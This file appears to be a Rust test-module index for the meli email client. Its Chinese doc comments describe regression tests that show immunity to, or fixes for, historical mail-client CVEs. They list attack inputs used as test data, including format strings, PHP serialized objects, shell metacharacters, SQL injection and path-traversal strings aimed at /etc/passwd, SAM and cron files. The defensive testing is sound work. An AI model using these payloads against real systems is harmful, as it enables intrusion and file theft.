/// CVE-2000-0567（Microsoft Outlook / Outlook Express；CVSS v2 5.0，CWE-120
/// 缓冲区溢出）超长邮件头（超长 `Date` 头）缓冲区溢出→RCE 回归（issue #135，
/// 表 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution）：攻击者
/// 发送超长/畸形 `Date` 头写穿 Outlook 的固定长度拷贝缓冲区。meli 是 Safe
/// Rust，无固定缓冲区、无 `strcpy` 等价物，`dates::date_time` 只用
/// `SmallVec<[u8; 32]>` 拼接有界片段、`obs_zone` 把任意字母串折叠为固定
/// `-0000`、`header_value` 零拷贝线性扫描折行、`rfc822_to_timestamp` 不匹配
/// 即 `Ok(0)` epoch 兜底——三层锁定（L1 `header`/`headers`/`headers_raw`/
/// `mail` 不 panic/有界/确定/无放大；L2 `rfc5322_date` 对 1 MiB `A`、超长
/// 非法时区/月份 token 与截断/空格/NUL 畸形变体返回 `Result`；L3
/// `Envelope::from_bytes`/`headers()` 全链路含折叠 `Received` 链）结论为
/// **免疫证明，未发现缺口，未改动生产代码**。
#[cfg(test)]
#[path = "CVE-2000-0567.rs"]
mod cve_2000_0567;

/// CVE-2001-0145（Microsoft Outlook 98/2000、Outlook Express 5.x；CVSS v2
/// 7.5，缓冲区溢出 → RCE）vCard 生日（BDAY）字段溢出回归（issue #136，表 2
/// of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution）：畸形/超长
/// BDAY 触发 Outlook 固定长度拷贝溢出、任意代码执行。meli 是 Safe Rust，
/// BDAY 值以自有 `String` 原样保存、`bday()` 走 `get_only` exactly-one 规
/// 则、生产端 `timestamp_from_string` strptime 失败即 `None` 兜底——四层锁
/// 定（L1 `parse_component`/`read_component`/`Vcard::build` 对 64 KiB–1 MiB
/// BDAY 形状不 panic/有界/确定/无放大；L2 `bday()` 语义与 `property.rs`
/// 转义往返；L3 `with_bday`→`write_component` 折行往返；L4
/// `CardDeserializer`→`Card` 生产路径拒绝语义）结论为 **免疫证明，未发现
/// 缺口，未改动生产代码**。
#[cfg(test)]
#[path = "CVE-2001-0145.rs"]
mod cve_2001_0145;

/// CVE-2025-49113（Roundcube < 1.5.10、1.6.x < 1.6.11 webmail；CVSS 9.9，
/// 在野利用，2026-02-20 列入 CISA KEV）认证后反序列化 RCE 回归（issue
/// #137，表 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code
/// execution）：未校验的 `_from` 参数流入 PHP `unserialize()`，认证用户提交
/// 序列化对象图（`O:8:"stdClass":…`、`__PHP_Incomplete_Class` 载体）即服务端
/// 执行代码，补丁发布 48 小时内被武器化。meli 无 PHP 运行时、无 webmail
/// 服务端、无任何对象反序列化器，字面链条不存在；按 issue 指定等价面（认
/// 证用户可控字符串参数流向强能力 sink）映射到配置查询
/// （`conf.rs`/`conf/` 的 `listing.filter: Option<Query>`）、命令解析器
/// （`command/parser.rs` 的 `search`/`select`/`filter`/`pipe` 参数）与 IMAP
/// 搜索序列化器（`melib/src/imap/search.rs`，`Query` 变成协议流字节的地
/// 方）。语料提交 PHP 序列化载荷、shell 元字符（反引号、`;`、`$()`、`|`）
/// 与未注册 scheme URL 攻击全部三面，四层锁定结论为 **暴露一处真实缺口并
/// 修复（CWE-93：含 CR/LF 的搜索值与 flag 关键字原样进入 IMAP 命令文本，
/// 提前终结命令行 → 命令注入；`listing.filter` 配置串可携带 `\r\n` 转义经
/// `quoted_string` 语法抵达）**：修复后 CR/LF 值走 RFC 3501 literal（`Quoted`
/// 重试策略保持既有「无引号形态」契约）、flag 关键字必须为合法 atom 否则
/// 警告跳过，回归同文件 melib 单测
/// （`test_imap_query_ascii_crlf_value_travels_as_literal`、
/// `test_imap_search_send_steps_crlf_literal_framing`、
/// `test_imap_query_flags_keyword_atom_whitelist`）与 [`cve_2025_49113`]
/// 分层锁定；反序列化/exec 等价面为结构性免疫证明（源码级 sink 不存在证
/// 明 + 配置/命令参数全部类型化解析或 `Err`、绝不进入 `Command::new` 参
/// 数）。
///
/// [`cve_2025_49113`]: self::cve_2025_49113
#[cfg(test)]
#[path = "CVE-2025-49113.rs"]
mod cve_2025_49113;

/// CVE-2005-0667（Sylpheed < 1.0.3 / 1.9.x < 1.9.5，CVSS v2 5.1，CWE-120）
/// 恶意邮件缓冲区溢出 → RCE 回归（issue #139，表 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution）：Sylpheed 解析
/// 攻击者可控的邮件结构（超长头部、畸形 `multipart` boundary、深层嵌套
/// MIME、非法 `Content-Type` 参数/charset）时写穿固定大小缓冲区，以受害者
/// 上下文执行任意代码。meli 是 Safe Rust，无固定缓冲区、无 `strcpy`
/// 等价物，CWE-120 无代码路径；按 issue 指定等价面
/// （`melib/src/email/parser.rs` 的 `mail`/`headers::header`/
/// `headers::headers`/`headers_raw` 与 `attachments` 模块的
/// `multipart_parts`/`parts`/`content_type_parameter`/`content_type`/
/// `multipart_boundary`，`melib/src/email/attachments.rs` 的
/// `AttachmentBuilder::parts_with_depth`/
/// `set_content_type_from_bytes_with_depth`/`decode_rec_helper` 与
/// `MAX_MULTIPART_NESTING_DEPTH=100`）锁定「超长输入是否仍线性、有界、
/// 无 panic、无放大、无栈溢出」——即 C 固定缓冲区的等价防线。
/// [`cve_2005_0667`] 四层锁定：L1 512 KiB 单行 `Subject`/`X-Long` 与
/// ≈256 KiB 折叠头经 `headers::header`/`mail`/`Envelope::from_bytes`
/// 不 panic/有界/确定/头值无放大（512 KiB 值完整存活）；L2 100 KiB
/// boundary（RFC 2046 §5.1.1 上限 70 字符）、空/纯空白/未闭合引号/含
/// CR-LF-NUL boundary、body 首字节 delimiter、无终止 delimiter 经
/// `multipart_boundary`/`parts`/`multipart_parts`/
/// `AttachmentBuilder::new().build()` 干净 `Err`/`Vec::new()` 且有界、树
/// 不放大；L3 150/300 层嵌套 `multipart/mixed`（每层不同 boundary）经
/// build + `decode_rec` 在 2 MiB 栈工作线程上树深恰好停在
/// `MAX_MULTIPART_NESTING_DEPTH=100`、第 100 层起退化为
/// `ContentType::OctetStream` 叶；L4 参数缺 `=`/未闭合引号/含 NUL-CRLF
/// 参数/数百 KiB 参数值/512 KiB charset/无 boundary 的 multipart/无 `/` 的
/// type 经 `content_type_parameter`/`content_type`/
/// `set_content_type_from_bytes` 干净 `Err` 或降级默认 `Text`/`UTF8`
/// （未知 charset tag 走 `Charset::from` 已知集兜底 `Ascii`），RFC 2045
/// token 白名单拒绝非法字节。结论为 **免疫证明，未发现缺口，未改动生产
/// 代码**；与 CVE-2024-21378（#23，boundary 形状/RFC822 递归）、
/// CVE-2020-16947（#105，256 KiB 头、100/101 层）、CVE-2026-70329（#27，
/// 64 KiB boundary/4096 部件）、CVE-2000-0567（#135，1 MiB `Date`）正交。
#[cfg(test)]
#[path = "CVE-2005-0667.rs"]
mod cve_2005_0667;

/// CVE-2005-2549（Evolution 1.4 / 1.5–2.3.6.1，CVSS v2 7.5，CWE-134 格式串）
/// 多重格式串攻击模拟回归（issue #140，表 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution）：Evolution 解析
/// 远程 vCard 数据、远程 LDAP 联系人、任务列表/日历条目时把攻击者可控字符串
/// 当作 C `printf` 家族函数的格式模板（vCard `FN`/`NOTE`/`ORG`/`TEL`，
/// iCalendar `SUMMARY`/`DESCRIPTION`/`LOCATION` 含 `%n%n%n`/`%s%s%s`/
/// `%99999999x`）→ DoS/可能 RCE。meli 是 Safe Rust，`format!`/`write!` 的格式
/// 模板必须是编译期字面量、攻击者值只能作参数值，且 meli 无 LDAP 客户端、无
/// 任务列表/日历提醒子系统，`ICalendar` 仅存在于
/// `melib/src/utils/vobject/icalendar.rs`、邮件查看路径不可达（映射结论见
/// CVE-2023-35636）——故按等价面做免疫证明。攻击面为
/// `melib/src/utils/vobject/{vcard,icalendar,component,property}.rs` 与生产
/// 消费端 `melib/src/contacts/vcard.rs` 的 `CardDeserializer`→
/// `TryInto<Card>`、`melib/src/contacts/card.rs` 的 `Card::to_vcard_string`。
/// [`cve_2005_2549`] 四层锁定：L1 完整 vCard/iCalendar 灌入 `%n%n%n`/
/// `%s%s%s`/`%99999999x`/`%p %p %p`/`%%…`/`%9999999$n`/混合形态与运行时构造
/// 的 64 KiB+ 重复 `%99999999x`，过 `Vcard::build`/`ICalendar::build`/
/// `parse_component`/`read_component`，断言不 panic、有界、确定、无放大且
/// 值完整存活；L2 `fullname()`/`note()`/`org()`/`tel()` 与事件
/// `summary()`/`description()`/`location()` 逐字节等于攻击字面值、`%` 既不
/// 扩展也不消失、`%99999999x` 输出长度 == 输入长度（无 1e8 宽度扩展）；
/// L3 `VcardBuilder`/`EventBuilder` 构造 → `write_component` 折行 → 重新
/// build 后逐字节相等；L4 `CardDeserializer`/`Card::to_vcard_string` 对
/// `FN`/`NOTE`/`ORG`/`TEL` 逐字保留、`N` 按契约跳过、畸形行干净 `Err`。另
/// 以源码级锚点证明 vobject/contacts 解析路径无 printf 族 FFI、无 `unsafe`。
/// 结论为 **免疫证明，未发现缺口，未改动生产代码**；与 CVE-2001-0145
/// （BDAY 固定缓冲溢出）、CVE-2006-2386（vobject 通用畸形结构）、
/// CVE-2009-0587（PHOTO/KEY base64 巨值）、CVE-2023-35636（ICS 不可抵达）、
/// CVE-2001-0473（mutt IMAP 协议响应格式串）正交，标记 `2549` 逐字隔离。
#[cfg(test)]
#[path = "CVE-2005-2549.rs"]
mod cve_2005_2549;

/// CVE-2005-2550（Evolution 1.4 / 1.5–2.3.6.1，CVSS v2 7.5，CWE-134 格式串）
/// 攻击模拟回归（issue #141，表 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` —
/// virus / code execution，2026-10-05 外部 KIMI 调研增补行）：Evolution 解析
/// 远程 vCard 数据、远程 LDAP 联系人、任务列表/日历条目时触发多重格式串漏
/// 洞——任务列表条目（`VTODO`）与日历条目（`VEVENT`）的
/// `SUMMARY`/`DESCRIPTION`、vCard `FN`/`NOTE` 含 `%n`/`%s`/`%99999999x`
/// → DoS/可能 RCE。meli 是 Safe Rust，`format!`/`write!` 的格式模板必须是
/// 编译期字面量、攻击者值只能作参数值，无 printf 族 FFI、无 `unsafe`，且
/// meli 无 LDAP 客户端、无任务列表子系统（`VTODO` 全仓无生产消费者，
/// `events()` 以 `Err(&Component)` 原样上浮、数据不丢）——故按等价面做免疫
/// 证明。[`cve_2005_2550`] 多层锁定：L1 `VTODO`/`VEVENT`/vCard 灌入
/// `%n`/`%s`/`%99999999x`/混合与 64 KiB+ 重复 `%99999999x`，过
/// `ICalendar::build`/`Vcard::build`/`parse_component`/`read_component`，
/// 不 panic、有界、确定、无放大、值逐字存活；L2 `VTODO` 经 `events()` 以
/// `Err(&Component)` 上浮、组件名与字段逐字、混合日历顺序稳定、双
/// `SUMMARY` 不可灌水不丢数据；L3 手工 `VTODO` Component 与
/// `EventBuilder`/`VcardBuilder` 经 `write_component` 折行往返逐字节相等；
/// L4 `CardDeserializer` 对 `FN`/`NOTE` 逐字、`Card::to_vcard_string` FN
/// 往返、畸形/截断输入干净 `Err`。另以源码级锚点证明 vobject/contacts 解析
/// 路径无 printf 族 sink。结论为 **免疫证明，未发现缺口，未改动生产代码**；
/// 与 CVE-2005-2549（vCard 四字段+VEVENT 三字段面，`%n%n%n` 形态载荷）正
/// 交，本语料以任务列表（`VTODO`）为焦点、载荷为 issue 原文单发形态，标记
/// `2550` 逐字隔离。
#[cfg(test)]
#[path = "CVE-2005-2550.rs"]
mod cve_2005_2550;

/// CVE-2008-1108（Evolution 2.22.1 及更早版本；CVSS v2 7.6，CWE-119；NVD
/// 2008-06-04，Secunia Research 2008-22 / BID 29527）**iCalendar 附件长时区
/// 字符串缓冲区溢出 → 任意代码执行**攻击模拟回归（issue #142，表 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — 病毒/代码执行，2026-10-05 外部 KIMI
/// 调研增补行）：ITip Formatter 插件禁用时，附件中超长时区字符串被拷入定
/// 长栈缓冲，溢出 → RCE。meli 不链接 Evolution/libecal，无 ITip 体系；issue
/// 指定的等价面是 `melib/src/utils/vobject/` iCalendar 解析栈
/// （`ICalendar::build`/`EventBuilder`/`parser.rs`/`component.rs`）与邮件搭
/// 载层。[`cve_2008_1108`] 多层锁定：L0 完整 RFC 5322 邮件搭载 RFC 5545 折
/// 行 64 KiB `TZID` 的 `text/calendar; method=REQUEST` 附件，逐字抵达解析
/// 边界；L1 64 KiB–4 MiB 四档 `TZID`（未折行 + 折行）过 `ICalendar::build`，
/// 不 panic、有界、`Ok`、属性与 `DTSTART;TZID` 参数两落点逐字节精确、无放
/// 大；L2 经典定长缓冲尺寸 ±1 边界扫描逐字节往返；L3
/// `TZOFFSETFROM`/`TZOFFSETTO`/`TZNAME`/`X-LIC-LOCATION` 家族与多字节
/// UTF-8 长值；L4 `ATTENDEE;CN=<64 KiB>` 等长参数逐字存活；L5 畸形结构
/// （未闭合/错配 END/裸属性）与 65 层嵌套 → 干净 `Err`、64 层 `Ok`；L6
/// `EventBuilder` 64 KiB 值与 `DTSTART;TZID` 参数经公共 API 读回 +
/// `write_component` 75 字节折行序列化重解析逐字节相等；L7 源码锚点证明
/// vobject 全目录无 `unsafe`、值字段为堆 `String`、递归有
/// `MAX_COMPONENT_NESTING_DEPTH` 封顶、`icalendar.rs` 不建模 `TZID`、查看
/// 路径不引用 vobject。结论为 **免疫证明，未发现缺口，未改动生产代码**；
/// 与 CVE-2023-35636（ICS 查看路径不可达 + URL 解引用）、CVE-2009-0587
/// （vCard 巨型 base64 PHOTO/KEY）、CVE-2005-2549/2550（vCard/任务列表格式
/// 串）、CVE-2001-0145（BDAY 定长缓冲）正交，本语料以时区字符串
/// （`TZID`/`TZOFFSET*`/`TZNAME`/`ATTENDEE` 参数）为焦点，标记 `1108`
/// 逐字隔离。
#[cfg(test)]
#[path = "CVE-2008-1108.rs"]
mod cve_2008_1108;

/// CVE-2018-14361（neomutt < 2018-07-16、mutt 侧经发行版补丁；CVSS v3.1 9.8
/// CRITICAL，CWE-824 访问未初始化指针）**恶意 NNTP 服务器对 `OVER`（`XOVER`）
/// 命令返回畸形或超长的 overview 响应行，mutt/neomutt 在 messages data 内存
/// 分配失败后继续使用未初始化指针 → 任意写**攻击模拟回归（issue #155，表 2
/// 病毒/代码执行）。NVD 口径：*"An issue was discovered in NeoMutt before
/// 2018-07-16. nntp.c proceeds even if memory allocation fails for messages
/// data."*（修复提交 neomutt `9e927affe3a021175f354af5fa01d22657c20585`）。
///
/// 攻击面核实：meli 的 OVER 行解析全在 `melib/src/nntp/`——
/// `protocol_parser.rs::over_article` 先以 `is_not("\t")` 取文章号并要求
/// `is_ascii_digit`，字段间恰 7 个 `tag("\t")`、结尾 `tag("\r\n")`，最后
/// `usize::from_str(num)` 受检转换（溢出即 `Err`）；subject/message-id/
/// references 经 `Envelope::set_*` 落入堆 `String`，无定长缓冲、无分配失败后
/// 的裸指针续用（Rust 分配失败即 abort）；`connection.rs::read_lines` 以
/// `enforce_response_size_limit(ret.len())?` 封顶 64 MiB，`224`/`423` 期望码
/// 由 `command_to_replycodes("OVER")` 给出；`mod.rs` 的 `fetch_envs`/refresh
/// 以 `over_article(l)?` fail-closed；全目录无 `unsafe`、无 C 定长缓冲原语、
/// 无 `MaybeUninit`/`from_utf8_unchecked(`/`set_len(`。
///
/// [`cve_2018_14361`] 分五层锁定（详见模块文档）：L0 合法
/// `224 …` 多行响应经真实 `NntpStream::read_lines`（`is_multiline=true`、
/// `expected=command_to_replycodes("OVER")`）逐字节保留、`.` 终止行被剥离，
/// `over_article` 对合法行逐字段（subject/from/date/message-id/references）
/// 精确落入 Envelope；L1 攻击语料（缺 tab 七位置、无 CRLF、裸 LF、空文章号、
/// `\t` 开头、非数字/带符号/十六进制、溢出数字、合法数值边界、经典定长缓冲
/// ±1、10+ tab 多余字段、NUL、64 KiB–1 MiB subject/message-id/references、
/// 超长 `:bytes`/`:lines`）逐条 `catch_unwind` 不 panic，Ok 形态 uid 精确、
/// Err 形态干净，并以 `split_rn().skip(1)` + `?` 相同表达式钉死 fail-closed
/// 消费语义，另以 read_lines 子集钉住无效 UTF-8 的 U+FFFD 降级与分层；
/// L2 永不发 `.` 终止行的 `224` 多行响应在生产 64 MiB 上限处
/// `ProtocolViolation`，`ret.len()` 有界、写入量 > cap、watchdog 内完成；
/// L3 `include_str!` 钉住 `is_ascii_digit`、`usize::from_str(num)`、恰 7 个
/// `tag("\t")`、`tag("\r\n")`、`enforce_response_size_limit(ret.len())?;`、
/// 增量扫描游标、`OVER → &["224 ", "423 "]`、`over_article(l)?`，递归扫
/// `melib/src/nntp/` 证明无 `unsafe`/C 原语/未初始化指针原语；L4 struct
/// literal 构造真实 `NntpConnection`（注入 `Connection::Fd` +
/// `UnixStream::pair()`）先发 `OVER 1-2` 再读，合法行解析、畸形行消费层
/// fail-closed、`423` 单行空集、非期望码读取层 fail-closed。与 CVE-2018-14349
/// （IMAP NO 文本）、14350（INTERNALDATE）、14351（STATUS literal）、
/// 14352/14353（imap_quote_string）、14354/14357（命令注入）、14356（空 UID）、
/// 14358（RFC822.SIZE）、14359（base64）、14360（NNTP GROUP 首行）划界，标记
/// `14361` 语料逐字隔离。结论：**免疫证明，未发现缺口，未改动生产代码**——
/// Rust 无「分配失败后使用未初始化指针」路径，Safe Rust 分配失败即 abort，
/// `over_article` 受检解析 + 64 MiB 封顶 + 消费点 fail-closed 结构性免疫
/// CWE-824。
///
/// [`cve_2018_14361`]: self::cve_2018_14361
#[cfg(test)]
#[path = "CVE-2018-14361.rs"]
mod cve_2018_14361;

/// CVE-2018-14362（mutt < 1.10.1、neomutt < 2018-07-16；CVSS v3.1 9.8
/// CRITICAL）**恶意 POP3/IMAP 服务器用 mailbox 名/UID 里的危险字符污染头
/// 缓存键或缓存文件路径**攻击模拟回归（issue #156，表 2 病毒/代码执行）：
/// mutt 的 `pop.c` 未禁止 UID 中的危险字符，攻击者可借其注入恶意的头缓存
/// 路径。**meli 无 POP3 后端**——`melib/src/` 全目录递归扫描不含任何
/// `pop3`/`POP3`/`Pop3Type` 痕迹，`backends.rs` 只注册 maildir/mbox/imap/
/// notmuch/jmap/smtp；issue #156 指定的等价面是「服务器控制的 mailbox 名/
/// 消息标识 → 头缓存键或文件系统路径」链。
///
/// [`cve_2018_14362`] 分六层锁定（详见模块文档）：L0 合法 mailbox 名/UID 经
/// [`generate_envelope_hash`] 得确定可复现的整数哈希（并与生产
/// `DefaultHasher` 公式逐条重算比对），真实 `Sqlite3Cache`（自管临时目录）
/// 合法往返；L1 攻击语料（`../`、`..\`、纯 `..`、`..%2e%2e`/`%2e%2e%2f`/
/// 大小写编码、`/`、`\`、NUL、CR/LF 混合、空串、64 KiB/1 MiB、SQL 元字符、
/// Unicode 同形分隔符 U+2044/U+2215/U+FF0F、`..;/`、深链、盘符/UNC）全部经
/// `generate_envelope_hash` 不 panic、同输入同输出、输出为十进制整数（类型
/// 层面不可能携带路径字节），语料不塌缩；L2 真实
/// `ImapType::ingest_mailbox_list_line` + [`list_mailbox_result`] 喂 IMAP
/// literal 形式 `* LIST` 行，恶意名只作为 `ImapMailbox.imap_path`/`name`
/// 数据存活、畸形行 fail-closed；L3 真实 `Sqlite3Cache` 对恶意 mailbox 名
/// 派生的 hash 做恶意 subject/message-id 的 insert/find/update/
/// save+load 往返，邮箱名三字段逐字节往返，递归遍历临时目录断言恰一个
/// `.db`、无子目录、无路径逃逸子串、DB 路径不因内容变化；L4
/// `DatabaseDescription` 的 `name`/`identifier`/`application_prefix` 注入
/// `/`、`\`、NUL 全部 `Err(ValueError)` 且无文件落盘；L5 `include_str!`
/// 钉住 `h.write(mailbox_path.as_bytes())`（整数哈希化）、
/// `sqlite3::params![]` 绑定、`db_path` 的 `FORBIDDEN_PATH_CHARS` 校验行、
/// `CachedImapMailbox` 名字仅为 `String` 数据字段，并扫描
/// `melib/src/imap/` 证明无 mailbox 名 join 进路径、扫描 `melib/src/`
/// 证明 POP3 缺位。与 14349–14361 家族（IMAP NO/INTERNALDATE/STATUS/
/// `imap_quote_string`/命令注入/空 UID/SIZE/base64、NNTP `GROUP`/`OVER`）及
/// CVE-2020-16094（LIST 层级深度）划界，标记 `14362` 语料逐字隔离。
///
/// 结论分两半：直接 CVE 面**免疫**（无 POP3、哈希为整数、SQL 全参数绑定、
/// 邮箱名仅为数据）；L4 另暴露一个**真实跨平台防御纵深缺口并随本回归修复**
/// ——原 `db_path` 只按 `MAIN_SEPARATOR_STR` 校验，Windows 上 `/` 仍可逃出
/// 配置目录、NUL 完全未校验；现无条件拒绝 `/`、`\`、NUL，回归见
/// `melib/src/utils/sqlite3.rs::tests::
/// test_db_path_rejects_path_separators_and_nul`。生产代码改动仅限
/// `melib/src/utils/sqlite3.rs`。
///
/// [`cve_2018_14362`]: self::cve_2018_14362
/// [`generate_envelope_hash`]: meli::melib::imap::generate_envelope_hash
/// [`list_mailbox_result`]: meli::melib::imap::list_mailbox_result
#[cfg(test)]
#[path = "CVE-2018-14362.rs"]
mod cve_2018_14362;

/// CVE-2018-14363（mutt/neomutt < 2018-07-16；CVSS v3.1 7.5 HIGH；CWE-22
/// 路径穿越）**恶意 NNTP 服务器在 newsgroup 名里携带 `/`，mutt 的
/// `newsrc.c`/头缓存把组名直接拼进文件路径 → 头缓存目录穿越**攻击模拟回归
/// （issue #157，表 2 病毒/代码执行）。攻击语料家族：`../../` 相对穿越、
/// 绝对路径、UNC 风格（`\\server\share`）。
///
/// **meli 没有 newsrc 文件持久化**——`melib/src/` 全目录递归扫描不含任何
/// `newsrc` 痕迹，NNTP 状态只有 `nntp_store.db` 的 flags 表；服务器可控的
/// 组名在 [`cve_2018_14363`] 锁定的摄入层只变成整数
/// `MailboxHash::from_bytes(s[0].as_bytes())` 与
/// `NntpMailbox.nntp_path: String` 数据字段，从不进入 `PathBuf`/`Path::new`/
/// `File::`。唯一的 描述串→文件路径 站点是
/// `DatabaseDescription::db_path`，已由 issue #156 加固为无条件拒绝 `/`、`\`、
/// NUL（详见 [`cve_2018_14362`]）。
///
/// [`cve_2018_14363`] 分六层锁定（详见模块文档）：L0 合法 newsgroup 名经
/// `MailboxHash::from_bytes` 得确定可复现的整数哈希（并与生产
/// `DefaultHasher::write(bytes)` 公式逐条重算比对），真实 `Sqlite3Cache`
/// （自管临时目录）合法往返；L1 攻击语料（`../../meli`、`../../../etc/passwd`、
/// `/etc/cron.d/evil`、`C:\Users\pwn\evil`、UNC `\\attacker\share\pwned`、
/// 纯 `..`、`..\\..\\`、`./`、20 层 `../` 深链、NUL、CR/LF、`%2e%2e%2f`/
/// `..%2f` 百分号形态、Unicode 同形分隔符 U+2044/U+2215/U+FF0F、64 KiB/1 MiB
/// 长名、SQL 元字符 `'); DROP TABLE article;--`）全部经 `MailboxHash::from_bytes`
/// 与 `generate_envelope_hash` 不 panic、同输入同输出、输出为纯十进制整数
/// （类型层面不可能携带路径字节），语料不塌缩；L2 按 `nntp_mailboxes` 的真实
/// `split_whitespace` 4 字段解析逻辑喂敌意行，组名只作为 `String` 数据存活、
/// 畸形行 fail-closed；L3 真实 `Sqlite3Cache` 对敌意组名派生的 hash 做
/// insert/find/update/save+load 往返，data_dir 外哨兵文件的
/// 内容与 mtime 未变，递归遍历断言恰一个 `.db`、无子目录、无路径逃逸子串、
/// canonicalize 后 DB 仍在 data_dir 内；L4 `DatabaseDescription` 的
/// `name`/`identifier`/`application_prefix` 注入 `/`、`\`（UNC/盘符）、NUL
/// 全部 `Err(ValueError)` 且无文件落盘；L5 `include_str!` 钉住
/// `MailboxHash::from_bytes(s[0].as_bytes())`、`nntp_path: s[0].to_string()`、
/// `nntp_store.db`、`sqlite3::params![]`、`FORBIDDEN_PATH_CHARS` 校验行与
/// `directory.join(name`，并递归扫 `melib/src/nntp/` 证明无 nntp_path join 进
/// 路径、扫描 `melib/src/` 证明无 newsrc 持久化。与 [`cve_2018_14362`]
/// （UID/消息标识 → 缓存键面）划界：本回归锁 newsgroup/mailbox 名里的路径
/// 分隔符 → 文件路径面，语料与 marker 逐字隔离；与
/// [`cve_2018_14360`]/[`cve_2018_14361`]（NNTP 响应解析面）及 14349–14359
/// （IMAP/POP3 解析与命令构造面）互不相交。
///
/// 结论：**直接 CVE 面免疫，未发现缺口，未改动生产代码**——无 newsrc、
/// 组名只变整数哈希与 String 数据、唯一路径站点无条件拒绝分隔符与 NUL。
///
/// [`cve_2018_14360`]: self::cve_2018_14360
/// [`cve_2018_14361`]: self::cve_2018_14361
/// [`cve_2018_14362`]: self::cve_2018_14362
/// [`cve_2018_14363`]: self::cve_2018_14363
#[cfg(test)]
#[path = "CVE-2018-14363.rs"]
mod cve_2018_14363;

/// CVE-2000-0621（Outlook 98/2000、Outlook Express 4.x/5.x；CVSS v2 7.5）
/// 「Cache Bypass」本地文件读取攻击模拟回归（issue #158，表 3 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入 / web/HTML embedding）：
/// 畸形 HTML 邮件把内嵌资源写到缓存目录之外，客户端随后以缓存 / 本地上下文
/// 读回，从而读走系统文件。
///
/// **meli 没有「缓存目录」这个概念**，也不链接任何 HTML / MIME 资源抓取器或
/// 本地浏览器引擎——CVE 字面面没有对应物。等价面是「邮件控制的字节 → 磁盘
/// 路径」的每一个落点，唯一的暂存根是 `<temp_dir>/meli/`：
///
/// - `meli/src/types/helpers.rs` 的 `File::create_temp_file`：
///   `sanitize_separator` 无条件删除 `/` 与 `\`、`sanitize_filename` +
///   `cap_filename_component_bytes` 压成单一扁平组件、退化名
///   （`""`/`.`/`..`）回退随机名、合法名带 32 位 hex UUID v4 中缀、
///   `create_new(true)` + `0o600`、默认分支 `path` 实参为 `None`。
/// - `meli/src/mailcap.rs` 的 `expand_args` `%s` 分支：
///   `expand_nametemplate(nametemplate, a).as_deref()` 只当**文件名提示**，
///   第三实参 `None` 证明邮件内容无从选择目标目录。
/// - `meli/src/mail/view/filters.rs` 的 html filter：
///   `create_temp_file(&self_.unfiltered, None, None, Some("html"), true)`，
///   文件名实参 `None`、扩展名固定 `Some("html")`，HTML 渲染管线
///   （`sanitize` → `render`）无远程抓取器、无缓存目录。
///
/// [`cve_2000_0621`] 分五层锁定（详见模块文档）：L0 语料为真载体——内嵌
/// `multipart/mixed` 邮件（`text/html` 正文含 `<img src="cid:…">` + 八个
/// 附件）覆盖 `../../../../etc/passwd`、`..\..\windows\system32\config\SAM`、
/// `....//....//etc/shadow`、`/etc/passwd`、`..%2f..%2fetc%2fpasswd`、
/// `%2e%2e%2f%2e%2e%2fetc%2fpasswd` 与 RFC 2047 Q 装甲等价形，`Attachment::
/// filename()` 解码重组装甲、逐字保留百分号编码（meli 无 percent-decoder）；
/// L1 `sanitize_separator` 删除两族分隔符、`sanitize_filename_component`
/// 输出单一扁平组件、退化名返回 `false`；L2 `create_temp_file` 对每个拼写
/// 落在 `<temp_dir>/meli/` 内、组件扁平、`0o600`，退化名回退随机名，绝对
/// 路径拼写不触碰真实 `/etc/passwd`（len/mtime 不变）；L3 mailcap `%s`
/// 端到端（`MailcapEntry::run` 驱动 `expand_args`）用敌意附件名 +
/// `nametemplate`（`%s/../../../../etc/passwd`、`..\..\%s`）验证临时文件在
/// temp root 内、展开命令引号包裹该路径；L4 `include_str!` 钉住
/// `dir.push("meli")`、`.create_new(true)`、`permissions.set_mode(0o600)`、
/// `matches!(f, "" | "." | "..")`、`value.replace(['/', '\\'], "_")`、
/// `expand_nametemplate(nametemplate, a).as_deref(),None,None,false,` 与 html
/// filter 的固定 `Some("html")` 落盘，并扫描 HTML 渲染管线证明无远程抓取器 /
/// 无缓存目录。
///
/// 与近亲划界：与 [`cve_2024_43604`]（issue #28 保存路径扁平化）、
/// [`cve_2002_1210`]（issue #59 落盘可预测性 / `file://` 读回）、
/// [`cve_2003_0376`]（issue #47 超长名）、[`cve_2002_2351`]（issue #61 尾点
/// 检查 / 落盘分歧）、[`cve_2025_47176`]（issue #26 分隔符类路径穿越）正交；
/// 本回归焦点 = 「缓存 / 暂存根逃逸 + 读回」类、1998–2000 年代拼写
/// （`....//` 点堆、Windows `SAM` 目标、百分号编码形），语料 marker `0621`
/// 逐字隔离。
///
/// 结论：**免疫证明，未发现缺口，未改动生产代码**。
///
/// [`cve_2000_0621`]: self::cve_2000_0621
/// [`cve_2002_1210`]: self::cve_2002_1210
/// [`cve_2002_2351`]: self::cve_2002_2351
/// [`cve_2003_0376`]: self::cve_2003_0376
/// [`cve_2024_43604`]: self::cve_2024_43604
/// [`cve_2025_47176`]: self::cve_2025_47176
#[cfg(test)]
#[path = "CVE-2000-0621.rs"]
mod cve_2000_0621;
